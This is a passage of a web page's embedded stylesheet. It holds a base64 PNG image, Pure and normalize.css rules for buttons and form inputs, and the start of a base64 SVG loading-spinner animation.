Wq8x9MRpqC0P6rge2rmgfrwhLCjYuJoeAU+Jg92w6vQQYjEEICACdv5uHJNoHNvmxTSL4S9ejMnMjkr+2G8bKPcJ7O43oQUEILAUAU+JQ70UBMaFAASiEPD8udKvUTzMX0klFx/yd3NWD0nIuuPeq2nbvTktIQCBuQn8de4Bb4znedJxw2x2QQACjwTWWprYzd9b2XkzyLE99mTcYgizOEH6JDWrOKqy19Jk7yEOlkpgLcftOlA9Avj74/bj5smi1dZ/JAfJ/lFs3UXxkjhUohFcEMEICEBgDAF7APBqjIIJ++6kezOh/pxU2+8dWondtCjDCRjH9fDuxfX8WJzHOJwrgUqOmXz/uNRiVDmodyP57XFZ/LXZLq7/RWDAMZD8MfCHYriSeCy1jOI6052B51h6PL6e2/TA8dbrfPv8HKDTbeJ6eg355DROS5i10aAfJHbtnPpeY+fLO8laMmvx8BsHm2TUs3rNYBCAwFQE7Hy2i6fHsvNolGObLJY2KbAlpR+BWs3f9utSfGvOz+IPgSQB2PXxQWIT+V8ktWSOa2bQOG8kvz9KreUsxUPiUM/iKYNAAAJzEXg910A9xzmo/a5nn9KbrwWA5KHfUVCr+Yd+XWgtAnymxGGQEoEgY+08/0PyVhIkSxW7TpstnyUPkpVksuIhcfA6yZgMOoohkDkBu4iZeCz8daX+UbFYfpJMejPqb5bLHrWsshs4pR+BVs33/brQGgKLELDr4IPEJum1xFMJMuatxN5C1JJJytKJQyWvwiSeoRQCEFiSgNcHAltBOSwJJtGx17LbkoeQqP1zmP1Gg5A0DCP9r2Hd6AWBWQlsNJolDDY591yCjLNrkSUQdu2OWpZOHF5G9QZlEICAFwJ2gV15MeaZHbtn22x2I2A3oEluRN2Gd93KbtLvXFvo2zjOSd/xKd06u5f98ii2nko5XrMfYhq8ZOJg8OuYzqALAhBwQ8DO740ba04N4enmKY8+WxbXT5K6T6eM28JjfHAbqWjHq0EDBCYhUEnrZ4nX+1kXp9+qkT30CV0a32uzZOJQ3zOO/RCAQNIEXju1fi+7Wqe2pWCWTZZ5wv71EwC7GVcpBM2xjR8d24ZpZRN4kPv2oMSueamXtRyIcr1aMnHwOqlI/eDAfgh4IWAXKhOPhbcO46PyRirsRhTGq0pOQ8m+xwzWQcq2MRWiCwKRCNjDEXtSn1NZyRlLhOoxTi2VOFQyOowxnL4QgEASBF46tXIru2zSQhlHYK3uljy8Gacmmd5BltqN910yFvs2lATed3xKtC7K5No5uA+y72GojUslDl4nE0M50g8CELhMoL5cvXitJQ27xa3IwwC70dpE2ibUQZJreSPHLEmqcnVwAb+2C4zJkBC4RsCuZXYdq641yKj+rXz5MMSfJRIHC0w9xFj6QAACyRHwfL7/nBxN3wZXMu+zxJIIi3supZIjOfq1dHy2MqBd2gjGh8ATAp+0vn6ynftqLQcf+jq5ROLwpq+RtIcABJIm8NKp9a3sapzalrJZdo23ifaDJOUEopL9NpEwCRJKXAIf46pDGwRGEfig3iUlDUdYb7VSHze6LJdIHF52MYw2EIBANgQqeRKcesNbh2kCYwmD3ZA+Sx4kKSUQlez99Ci2TolPoJFKEwoEPBB4kBG1B0MWsuGDxq26jj134rCRYaGrcbSDAASyIfDaqSeN7No7tS0Hs54mEHZzWjt1yuysJfYbBksaKgllOgK8bZiOLZr7Edio+dt+XbJs/Yu8Cl08mztxeNnFKNpAAALZEagde8Rfdpk+OE8n5jY5fyMJ0w97dwSbNFhC8/lxub7bgwZjCbRSsB2rhP4QiEAgSIed/5Svb4Utebhb5kwcgqyxizQFAhAoj8BKLtdO3d7KrtapbTmaZZPzdxKbrFsSYeuVZI4SNEgtsRvkH49L27bjkzIPgZ/nGYZRIHCXgCUNnPvfMNm1+eHb5uW1v16unqS2nkQrSiEAgVQIvJShW6fG2mSGJ0/zB8duVCZvHodutNxL/i1pJY1kaAnqaFJJ/i6xcYKEshyBVkNvlxuekSHwJwG75lR/brFyJPBWKzuJXYcvlr9crJ2m8rPUhmlUoxUCEEiEwHeys3VqK9cop4GRWc0T0357sn5c/ZtWwuOGLY/rj1UsnBB4JTu2TmwZasaDOtrkivKVQKPFD4nBWMleu97bknJOoFHV1ZjO9cZhIyOChAIBCJRN4LXc/8kpgp9l1wentpVuVvUEwNP1J9WsOifQyr6tcxsxrwwC7+QmScP1WFfaVUu2krMy128cXp6NTAUEIFAigdqx01vZ1ji2D9MgkDIBrw8MUmaK7f0JBHWp+3crrsfVt2pzJA5BuO2NAwUCEICAPeWpHWOwtw4UCEAgLoFG6nZxVaINAoMIXJ0QD9KWb6cg1+pL7s2ROFwc+JIx1EEAAkUQ8PwGslEETCgQgEA8AiTk8ViiaTiBoK718O7F9byYZM2ROHieJBR3FOAwBBwQqGRDcGDHNRNeXdtBPQQg0JvAVj2a3r3oAIH4BC5OhOMPk43GIE/q595MnTjYJ0rh+aBsQwACxROwH0l7La0Me+/VOOyCQEIEDrKVtw0JBSxjU1fyzeaklH4Ezh7+T504nA3Yz15aQwACmRKonftlkx2b9FAgAIHhBOx/ZW+Hd6cnBKIRsKTBkgdKPwKVmoenXaZMHGwgsruntFmHAASOBOwCXh83HC4Psom/AuMwMJiUDIFWlj4kYy2G5k7gx9wdnNC/k7n8lIlDPaETqIYABNIn4P1CvhXiJn3MeACBRQi8WmRUBoXAOQF7UHUy+T1vQs0NAidfD02ZOJwMdMMgdkEAAmUSsAt5cO46kx/nAcI8lwS2sqpxaRlGlUiApGFc1NfqHo4qpkocUpgQHBmwhAAEliNQLzd0p5Fbtfq5U0saQQACRuAg4TM/jgVPBL73ZEyitlRHu6dKHHjbcCTMEgIQuEUghWvFgxzY33KCfRCAwJ8E7C2dJQ8UCHghUHkxJGE7/ky+/jqBE0E67Y0DZRyBRt150jmO4dS91xrg3dSDZK4/yD+7Xuyc+2mTod+d24h5EFiagJ3H3s/lpRkx/rwEgoYzoYwjsD52nyJxqI/KWY4i8FG9m1Ea6Dw1AYvPW8lq6oEy129vHbxPNvay0T6/IFHM/GDEvcEEDuppCTYFAp4IBE/GJGzL+mj7FJ8qpfDpwdF/r0u7AG+9GoddJwSI0wmOQRsb9QqDes7b6b2Ga+YdktEgkAyBf8pSu3dRIOCJQOXJmMRt+cIyduKQygTAe+x23g3Evj8J2JshyngC9XgVs2iwJ6pMjmZBzSAJEXgvW5uE7MXUcgj8bzmuTu7pykaInTjwtiFO3JiMxuE4h5a9BmnnGCjzMVK5dlisLXmgQAACXwnYNZC/osTR4JXA2qthCdr1hWXMxCEIwiZBEN5MbmVQ480o7LlJYHdzLzu7EAhqlMr1w+L9votTtIFA5gQO8s8+UaJAAAKFEIiZONSFMJvaTZuUUNIiwBuiOPFK5a2DeWtPWPdx3EYLBJIlYG/f2mStx/ASCKxLcHImH/9m48RMHFK66c/EeNAw/xrUi05LErAJZLukAZmMvZEfISFffpCth4TsxVQIxCTws5TtYipEFwQmILCaQGepKoM5HitxSO2G7zXoexnWejUOu24S4AZ6E0/nnXXnlss3PMgESx4oECiNgF3vHkpzGn8hAIF4iQNvG+IcTR/jqEHLAgSIXRzoqV1LLNl/Fcd1tEAgCQIc80mECSMhMA2BGG8cgkzbTGNecVq3xXmcj8N2M23zcWcxT4JGTu16spXN7yUUCORO4CAH7cfQtqRAAAIFEoiRONQFcpvC5Z2UcjGegux8Oi2GlPEEUnvrYB7bj6W3tkKBQKYE7P5kn+a1mfqHW3kSYF4VL65fWMZIHFK8ycfDGE/Tr/FUoWkhAnyuFAf8RmpCHFWzarHkYT/riAwGgfkIcHzPx5qR4hHgmhyP5b9N1djEIdUbfDyMcTQdpGYbRxVaFiRgF6h2wfFzGrpO0Bk7j+2JrB0HFAjkROCVnNnm5BC+QAACwwiMTRx42zCM+/Neu+cVbCdLgFjGCV2q1xaShzjxR4sfAvamYevHHCyBQC8Cba/WNL5F4AvLMYlDkPbNrRHY15kAn7h0RuW+IbGME6IgNaleXyx5sCe0tqRAIGUCWxn/PmUHsL14Av8pnkA8AK2pGpM4vI5nS9GaWnnfFE0gL+f3cqfNy6XFvPlxsZHHD2zHwQ8SkofxLNGwDIGthrUEmAKBlAnYtZgSh0BjasYkDrUpoIwmsButAQXeCBDTOBGppWYVR9UiWuyGRfKwCHoGHUlgq/4kDSMh0t0FAbsOU8YTaI8qhiYOtRSkfEM/+u9h+S8PRmBDVAIfo2orW1mduPskD4kHsEDzt/KZpKHAwGfqciu/Dpn6NqdbzXGwoYlDqj9cPPrtZWmTitaLMdgRjQBxjYbyRQ6fRB6ThzYeFjRBYBIC76WVpGEStChdkECz4Ni5DP3lT7GaM0MSh6B+lYQyngBPpscz9Kph59WwxOwKsrdKzOZL5lry8A+JLSkQ8EjAEgb7C0oUCORG4NfcHFrAnz/nNEMShxyeAC7A/OKQ24u1VOZAgKQwXhRzecN5EJIfJCQP8Y4NNMUhYEnDNo4qtEDAHYHGnUVpGdTKXJMvZUjiUD/2ZTGOgGVvNpGg5EnAJodtnq7N7lWtEVezjzrNgHbOW/KwnUY9WiHQiwDHYy9cNE6UQCu77Z5MGUZg97Rb38ShVufVUwWsDybAq7PB6JLpeHKyJWO1T0Nrn2YNsuqgXvaE9/2g3nSCQBwCrdRYEttIKBDIncDH3B2c0L8Tdn0Th1w+GZiQbyfVNnHYdmpJo5QJnJxsKTviwPYcP5G078lfOWCLCeUR2Mvlf0hsSYFACQS2JTg5gY92jTi5TvRJHII6VxLKeAK78SrQkAABO9naBOxMwcQgI6sUDO1p41btbQJ36NmP5hAYSmCrjhxzQ+nRL1UCdo3dpmr8gnb/6/nYfRKHHJ/4Pecx1zZPoucivfw4JInxYpDrG09LML+T2JICgSkJ2Bsu3nJNSRjdngmcTYI9G+vAtovJVp/EoXbgRA4mtHKiycERfOhEgCSxE6ZOjWq1WnVqmV4ju0DbU+D36ZmOxQkQaGWjHV9bCQUCpRLYy/GmVOcH+H0x0eqaONQaMNcb9gCWo7rsRvWmc2oE7ELVpma0Y3trx7bFMO0nKfmn5BBDGTogIAJ2z7Gkwa5FFAiUTuDn0gF09N/uQe8vte2aOOT6icAlJlPXXczgph4U/YsSsBs3JQ6BEj6ZtOPlO0kTBxlaCiVgN377LIlEtNADALcvEmhUyz35IpqTSkuw7BpyVrokDkG9qrOeVAwhsFendkhH+iRNgGQxXviCVFXx1LnVZBfsHyQ/SS5evN1ajmEeCDQy4h+SrYQCAQicErDrKuU6AZurvr+2u0viUMITvmt8Ytd/jK0QfUkQaGWlnYiUOARKegNqF2+bADZx0KElcwIH+WeTIks6WwkFAhA4J9Cqyp6oUy4TGJ1Y/SG9/0WiMFhdjhG1BRB4wzkU5Rw6XotKPJfsGOJ6zP3oeA48X37S8REklGkJPEj9c/Ylb9txl2r5XYaXHLtLvr+7F8x7bxxqKSjxBn2P25D9O3U6DOlInywIWPwp8QjU8VQlo+m9LLW3DxxLyYRsFkPtvvJKwluGWXAzSEYE7Lyx84fylcBei5/vwbiXOLy8p4D9nQn82rklDXMk0MopOykpcQi8jqMmOS2tLP6nhElicqGbxOD30vqdZDuJdpRCIG8Cdk8e/VlOJogO8qNTInUrcQhSUkko4wlYQLbj1aAhcQIfE7ffk/lBxqw9GTSzLY3Gswmj3fTs+kIpi0Ajd4l/WTHH22kIbKXWpPRi95J9Fwi3EodSn+h14da3za5vB9pnSYDjIG5YuUZ9/csXNoF8Hxct2pwSsBv7D4/SOrURsyCQGoFXMtjOrVLLz3J8G8P5P6Tk0g8nqOvPpYoREHRkQeB3ecE5FIeBXaNWWRwVcZwIUvNBwvGVH4PPimstoSxP4EEmcI59Y/Bp+ZBEscDuJSXenz/0pXftjUMtRdyQ+9K83L5VdXN5F7UFEvhYoM9TuWzXqM1UyhPU28pme3L2nWQroaRPoJULxDT9OOKBfwIHmfiDZO/f1GgWbqXJri+9yrXE4WUvLTS+RWB3ayf7iiPA8RA35K/jqstCWysvnk427YZISYuATV6exjAt67EWAmkSsGtlKcnDVr72ThquhTVoB6/h4jEwnhQIPCVQ4uvQKa8p66dwWT8jsFLNg8Q+7ZoyDugez/eTYlRJKH4JPMg0jvVvDOyYza3YNdP8yjXO78YE7NIbB57gjSF62nevzfa0ii0IvPgIg6gEuGbdxnnQ7gfJ/0nsCVMjofghYPF5L/lO8oOkkVAgAIHlCNg5aefidjkTJhvZ7gHR/wQtT6XiZZlvJgs9ilMmEGR8rk8ylvDLrlmrlA+IBWxfa8wPEq73y52Ln8S/lnDsCkJC5UG2LnGd8zqmHcc5l1rO5XCd/Cw/7LofvdTS6PXgTNEubgjRD9FsFP7OuRb1WlNnc2TM74ix+0WS4jU2NZs/i/M7SZBQ0iTwILNTO+6mtPdTmmHsZbVNuFO+Z9v1Pdp89C/P0AVtm1DGEzhIxX68GjRkSiDILxNKHAKt1JhQhhOwG8tG8uPjcrgmej4l0GpjJ/ko4Z4gCImXIPtNKF8JHLQo5bh+kK+vJStJCqWVkfZZ0i4FY7ERAhCAAATSJWA3xlpiT6r+kEz5xDJH3b+L2TvJWkKBAATyIRDkygeJ5+uWXbMfJKkkODKVAgEIQAACORGo5IxNhG1C7PmGuZRtdqO2yUQtCRIKBCCQN4FK7n2SLHXNuTTu8TpEwpD3sYd3EIAABJIiYDeljcQSCW83zks30ynqPsv3XyRvJGsJBQIQKJNAkNsfJDZpn+Ja00WnXY8eJHZtnrz8ZfIRGAACEIAABHInUMlBm0D//XGZ02S6lU8mv0n2j2LbFAhAAAJHAjZp30heSirJ1OWgAXaSXx+XU4/3p34Shz9RsAIBCEAAAhEJrKUrSGz5tyfrK617LHsZdZBYgmBL2z7WaZUCAQhAoBOBlVptJN9LKkmQxCh2PWokdo3aSRYpf1lkVAaFAAQgAIGSCazl/EpyXBoLu8keS9CKSYzSPFHSav0/j9vN43Kv5eFxnQUEIACB2ASO17rqUfG1a93Ta5Fdk/4taR+l0dJFIXFwEQaMgAAEIACBjgSqC+2e3nAv7KYKAhCAAARiEPj/uUys/HxCf60AAAAASUVORK5CYII=")
    }

    /*! Pure v0.5.0 Copyright 2014 Yahoo! Inc. All rights reserved. Licensed under the BSD License. https://github.com/yui/pure/blob/master/LICENSE.md */
    /*! normalize.css v1.1.3 | MIT License | git.io/normalize Copyright (c) Nicolas Gallagher and Jonathan Neal */
    /*! normalize.css v1.1.3 | MIT License | git.io/normalize */
    html {
      -ms-text-size-adjust: 100%;
      -webkit-text-size-adjust: 100%
    }

    body {
      margin: 0
    }

    a:focus {
      outline: thin dotted
    }

    a:active,
    a:hover {
      outline: 0
    }

    img {
      border: 0;
      -ms-interpolation-mode: bicubic
    }

    input {
      vertical-align: baseline
    }

    input {
      line-height: normal
    }

    button {
      text-transform: none
    }

    button,
    input[type=submit] {
      -webkit-appearance: button;
      cursor: pointer
    }

    button::-moz-focus-inner,
    input::-moz-focus-inner {
      border: 0;
      padding: 0
    }

    .pure-button {
      display: inline-block;
      vertical-align: baseline;
      text-align: center;
      cursor: pointer;
      -webkit-user-drag: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      user-select: none
    }

    .pure-button::-moz-focus-inner {
      padding: 0;
      border: 0
    }

    .pure-button {
      font-family: inherit;
      text-decoration: none
    }

    .pure-button-hover,
    .pure-button:hover,
    .pure-button:focus {
      filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#1a000000', GradientType=0);
      background-image: linear-gradient(transparent, rgba(0, 0, 0, .05) 40%, rgba(0, 0, 0, .1))
    }

    .pure-button:focus {
      outline: 0
    }

    .pure-button-active,
    .pure-button:active {
      box-shadow: 0 0 0 1px rgba(0, 0, 0, .15) inset, 0 0 6px rgba(0, 0, 0, .2) inset
    }

    .pure-button::-moz-focus-inner {
      padding: 0;
      border: 0
    }

    .pure-form input[type=tel] {
      box-sizing: border-box
    }

    .pure-form input:not([type]) {
      padding: .5em .6em;
      display: inline-block;
      border: 1px solid #ccc;
      box-shadow: inset 0 1px 3px #ddd;
      border-radius: 4px;
      box-sizing: border-box
    }

    .pure-form input[type=text]:focus,
    .pure-form input[type=password]:focus,
    .pure-form input[type=email]:focus,
    .pure-form input[type=url]:focus,
    .pure-form input[type=date]:focus,
    .pure-form input[type=month]:focus,
    .pure-form input[type=time]:focus,
    .pure-form input[type=datetime]:focus,
    .pure-form input[type=datetime-local]:focus,
    .pure-form input[type=week]:focus,
    .pure-form input[type=number]:focus,
    .pure-form input[type=search]:focus,
    .pure-form input[type=tel]:focus,
    .pure-form input[type=color]:focus,
    .pure-form select:focus,
    .pure-form textarea:focus {
      outline: 0;
      outline: thin dotted \9;
      border-color: #129fea
    }

    .pure-form input:not([type]):focus {
      outline: 0;
      outline: thin dotted \9;
      border-color: #129fea
    }

    .pure-form input:focus:invalid,
    .pure-form textarea:focus:invalid,
    .pure-form select:focus:invalid {
      color: #b94a48;
      border-color: #ee5f5b
    }

    .pure-form input:focus:invalid:focus,
    .pure-form textarea:focus:invalid:focus,
    .pure-form select:focus:invalid:focus {
      border-color: #39f
    }

    .pure-form label {
      margin: .5em 0 .2em
    }

    @media only screen and (max-width:480px) {
      .pure-form button[type=submit] {
        margin: .7em 0 0
      }

      .pure-form input:not([type]),
      .pure-form input[type=tel],
      .pure-form label {
        margin-bottom: .3em;
        display: block
      }
    }

    /*! Pure v0.5.0 Copyright 2014 Yahoo! Inc. All rights reserved. Licensed under the BSD License. https://github.com/yui/pure/blob/master/LICENSE.md */
    body {
      font-weight: 400;
      background-color: #fff
    }

    p {
      margin: 0
    }

    h1 {
      margin: 0
    }

    a {
      text-decoration: none
    }

    div,
    a {
      -webkit-tap-highlight-color: transparent
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
      -webkit-appearance: none;
      -moz-appearance: none;
      margin: 0
    }

    @media screen and (min-width:48em) {
      h1 {
        text-transform: none
      }
    }

    .pure-form input[type=tel] {
      box-shadow: none;
      width: 100%
    }

    .pure-form input {
      -webkit-appearance: none
    }

    .pure-form input[type=color]:focus,
    .pure-form input[type=date]:focus,
    .pure-form input[type=datetime-local]:focus,
    .pure-form input[type=datetime]:focus,
    .pure-form input[type=email]:focus,
    .pure-form input[type=month]:focus,
    .pure-form input[type=number]:focus,
    .pure-form input[type=password]:focus,
    .pure-form input[type=search]:focus,
    .pure-form input[type=tel]:focus,
    .pure-form input[type=text]:focus,
    .pure-form input[type=time]:focus,
    .pure-form input[type=url]:focus,
    .pure-form input[type=week]:focus,
    .pure-form select:focus,
    .pure-form textarea:focus {
      border-color: #1476d9
    }

    .pure-form input[type=color]:disabled,
    .pure-form input[type=date]:disabled,
    .pure-form input[type=datetime-local]:disabled,
    .pure-form input[type=datetime]:disabled,
    .pure-form input[type=email]:disabled,
    .pure-form input[type=month]:disabled,
    .pure-form input[type=number]:disabled,
    .pure-form input[type=password]:disabled,
    .pure-form input[type=search]:disabled,
    .pure-form input[type=tel]:disabled,
    .pure-form input[type=text]:disabled,
    .pure-form input[type=time]:disabled,
    .pure-form input[type=url]:disabled,
    .pure-form input[type=week]:disabled,
    .pure-form select:disabled,
    .pure-form textarea:disabled {
      border: 0;
      background-color: #e6e7e8;
      color: #101010
    }

    ::-webkit-input-placeholder {
      color: #8f8f8f
    }

    :-moz-placeholder {
      color: #8f8f8f
    }

    ::-moz-placeholder {
      color: #8f8f8f
    }

    input:disabled::-webkit-input-placeholder {
      color: #b7b7b7
    }

    input:disabled:-moz-placeholder {
      color: #b7b7b7
    }

    input:disabled::-moz-placeholder {
      color: #b7b7b7
    }

    .pure-form button[type=submit] {
      margin: 0
    }

    .pure-button,
    input.pure-button {
      box-sizing: border-box;
      border-radius: .11765rem;
      background-color: #eeeef5;
      width: 100%;
      border: solid 1px #e4e7ef;
      white-space: normal
    }

    .puree-button-primary {
      color: #fff;
      background: #39f;
      border: 1px solid #39f
    }

    input.puree-button-primary:hover,
    .puree-button-primary:hover {
      background: #5cadff;
      border-color: #5cadff;
      color: #fff
    }

    input.puree-button-primary:active,
    .puree-button-primary:active,
    input.puree-button-primary:focus,
    .puree-button-primary:focus {
      background: #1476d9;
      border-color: #1476d9;
      color: #fff
    }

    a {
      color: #39f
    }

    input.puree-button-link {
      color: #39f;
      background: 0 0;
      border-color: transparent
    }

    input.puree-button-link:active,
    .puree-button-link:active,
    a:active,
    input.puree-button-link:hover,
    .puree-button-link:hover,
    a:hover,
    input.puree-button-link:focus,
    .puree-button-link:focus,
    a:focus {
      color: #1476d9
    }

    .puree-button-link:active,
    input.puree-button-link:active {
      color: #858585;
      background-color: transparent
    }

    .pure-button:active,
    .pure-button:focus,
    .pure-button:hover,
    .puree-button-hover {
      filter: none;
      background-image: none;
      box-shadow: none
    }

    .puree-v2 input[type=tel] {
      padding: 0 8px;
      border: 0;
      border-radius: 0;
      border-bottom: 1px solid #d8dade;
      background-color: transparent
    }

    .puree-v2 input[type=text]:focus,
    .puree-v2 input[type=email]:focus,
    .puree-v2 input[type=password]:focus,
    .puree-v2 input[type=tel]:focus,
    .puree-v2 select:focus {
      border-bottom: 2px solid #1476d9
    }

    .puree-button-link:disabled {
      color: #858585
    }

    .puree-spinner-button:after {
      display: none;
      content: "";
      background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHZpZXdCb3g9Ii0yNSAtMjUgMTAwIDEwMCIgdmVyc2lvbj0iMS4xIj48Zz48cGF0aCBkPSJNMjUgMCBBMjUgMjUgMCAwIDAgMjUgNTAiIHN0cm9rZS1kYXNoYXJyYXk9Ijc5IiBzdHJva2U9IiNlZWVlZWUiIHN0cm9rZS13aWR0aD0iNCIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBmaWxsPSJub25lIj48IS0tIEV4cGFuZGluZyBhbmQgY29udHJhY3Rpbmcgb2YgdGhlIGFyYyAtLT48YW5pbWF0ZSBpZD0iYTEiIGF0dHJpYnV0ZVR5cGU9IlhNTCIgYXR0cmlidXRlTmFtZT0ic3Ryb2tlLWRhc2hvZmZzZXQiIGZyb209IjkiIHRvPSI3NiIgZHVyPSI2MjVtcyIgYmVnaW49IjBzOyBhMi5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PGFuaW1hdGUgaWQ9ImEyIiBhdHRyaWJ1dGVUeXBlPSJYTUwiIGF0dHJpYnV0ZU5hbWU9InN0cm9rZS1kYXNob2Zmc2V0IiBmcm9tPSI3NiIgdG89IjkiIGR1cj0iNjI1bXMiIGJlZ2luPSJhMS5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PCEtLSBDaGFuZ2Ugb2YgdGhlIHN0cm9rZSB3aWR0aCAtLT48YW5pbWF0ZSBpZD0iYTMiIGF0dHJpYnV0ZVR5cGU9IlhNTCIgYXR0cmlidXRlTmFtZT0ic3Ryb2tlLXdpZHRoIiBmcm9tPSI0IiB0bz0iOCIgZHVyPSI2MjVtcyIgYmVnaW49IjBzOyBhNC5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PGFuaW1hdGUgaWQ9ImE0IiBhdHRyaWJ1dGVUeXBlPSJYTUwiIGF0dHJpYnV0ZU5hbWU9InN0cm9rZS13aWR0aCIgZnJvbT0iOCIgdG89IjQiIGR1cj0iNjI1bXMiIGJlZ2luPSJhMy5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PCEtLSBSb3RhdGlvbiBvZiB0aGUgYXJjIC0tPjxhbmltYXRlVHJhbnNmb3JtIGlkPSJhNSIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgZnJvbT0iMCAyNSAyNSIgdG89IjAgMjUgMjUiIGR1cj0iNjI1bXMiIGJlZ2luPSIwOyBhOC5lbmQiIGNhbGNNb2RlPSJzcGxpbmUiIGtleVRpbWVzPSIwOzEiIGtleVNwbGluZXM9IjAuMjE1LCAwLjYxLCAwLjM1NSwgMSIvPjxhbmltYXRlVHJhbnNmb3JtIGlkPSJhNiIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgZnJvbT0iMCAyNSAyNSIgdG89IjE4MCAyNSAyNSIgZHVyPSI2MjVtcyIgYmVnaW49ImE1LmVuZCIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PGFuaW1hdGVUcmFuc2Zvcm0gaWQ9ImE3IiBhdHRyaWJ1dGVUeXBlPSJYTUwiIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgdHlwZT0icm90YXRlIiBmcm9tPSIxODAgMjUgMjUiIHRvPSIxODAgMjUgMjUiIGR1cj0iNjI1bXMiIGJlZ2luPSJhNi5lbmQiIGNhbGNNb2RlPSJzcGxpbmUiIGtleVRpbWVzPSIwOzEiIGtleVNwbGluZXM9IjAuMjE1LCAwLjYxLCAwLjM1NSwgMSIvPjxhbmltYXRlVHJhbnNmb3JtIGlkPSJhOCIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgZnJvbT0iMTgwIDI1IDI1IiB0bz0iMzYwIDI1IDI1IiBkdXI9IjYyNW1zIiBiZWdpbj0iYTcuZW5kIiBjYWxjTW9kZT0ic3BsaW5lIiBrZXlUaW1lcz0iMDsxIiBrZXlTcGxpbmVzPSIwLjIxNSwgMC42MSwgMC4zNTUsIDEiLz48IS0tIE9wYWNpdHkgY2hhbmdlIC0tPjxhbmltYXRlIGlkPSJhOSIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJvcGFjaXR5IiBmcm9tPSIwLjciIHRvPSIxIiBkdXI9IjYyNW1zIiBiZWdpbj0iMHM7IGExMC5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PGFuaW1hdGUgaWQ9ImExMCIgYXR0cmlidXRlVHlwZT0iWE1MIiBhdHRyaWJ1dGVOYW1lPSJvcGFjaXR5IiBmcm9tPSIxIiB0bz0iMC43IiBkdXI9IjYyNW1zIiBiZWdpbj0iYTkuZW5kIiBmaWxsPSJmcmVlemUiIGNhbGNNb2RlPSJzcGxpbmUiIGtleVRpbWVzPSIwOzEiIGtleVNwbGluZXM9IjAuMjE1LCAwLjYxLCAwLjM1NSwgMSIvPjwvcGF0aD48cGF0aCBkPSJNMjUgNTAgQTI1IDI1IDAgMSAwIDI1IDAiIHN0cm9rZS1kYXNoYXJyYXk9Ijc5IiBzdHJva2U9IiNlZWVlZWUiIHN0cm9rZS13aWR0aD0iNCIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBmaWxsPSJub25lIj48IS0tIEV4cGFuZGluZyBhbmQgY29udHJhY3Rpbmcgb2YgdGhlIGFyYyAtLT48YW5pbWF0ZSBpZD0iYTEiIGF0dHJpYnV0ZVR5cGU9IlhNTCIgYXR0cmlidXRlTmFtZT0ic3Ryb2tlLWRhc2hvZmZzZXQiIGZyb209IjkiIHRvPSI3NiIgZHVyPSI2MjVtcyIgYmVnaW49IjBzOyBhMi5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PGFuaW1hdGUgaWQ9ImEyIiBhdHRyaWJ1dGVUeXBlPSJYTUwiIGF0dHJpYnV0ZU5hbWU9InN0cm9rZS1kYXNob2Zmc2V0IiBmcm9tPSI3NiIgdG89IjkiIGR1cj0iNjI1bXMiIGJlZ2luPSJhMS5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PCEtLSBDaGFuZ2Ugb2YgdGhlIHN0cm9rZSB3aWR0aCAtLT48YW5pbWF0ZSBpZD0iYTMiIGF0dHJpYnV0ZVR5cGU9IlhNTCIgYXR0cmlidXRlTmFtZT0ic3Ryb2tlLXdpZHRoIiBmcm9tPSI0IiB0bz0iOCIgZHVyPSI2MjVtcyIgYmVnaW49IjBzOyBhNC5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0iMC4yMTUsIDAuNjEsIDAuMzU1LCAxIi8+PGFuaW1hdGUgaWQ9ImE0IiBhdHRyaWJ1dGVUeXBlPSJYTUwiIGF0dHJpYnV0ZU5hbWU9InN0cm9rZS13aWR0aCIgZnJvbT0iOCIgdG89IjQiIGR1cj0iNjI1bXMiIGJlZ2luPSJhMy5lbmQiIGZpbGw9ImZyZWV6ZSIgY2FsY01vZGU9InNwbGluZSIga2V5VGltZXM9IjA7MSIga2V5U3BsaW5lcz0